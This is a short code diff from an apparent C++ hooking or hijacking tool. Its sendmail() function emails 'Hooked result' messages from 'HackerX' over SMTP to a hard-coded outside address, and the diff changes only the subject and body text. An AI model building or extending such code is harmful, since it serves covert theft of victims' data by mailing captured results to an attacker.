@@ -25,8 +25,8 @@ void sendmail() {
 	mailman.put_SmtpPort(465);
 
 	CkEmail email;
-	email.put_Subject("Hijacked..");
-	email.put_Body("Well Done!");
+	email.put_Subject("Hooked result has been successfully arrived!!");
+	email.put_Body("Well Done! Happy Hacking :)");
 	email.put_From("HackerX");
 
 	bool success = email.AddTo(NULL, "didlaak6000@naver.com");
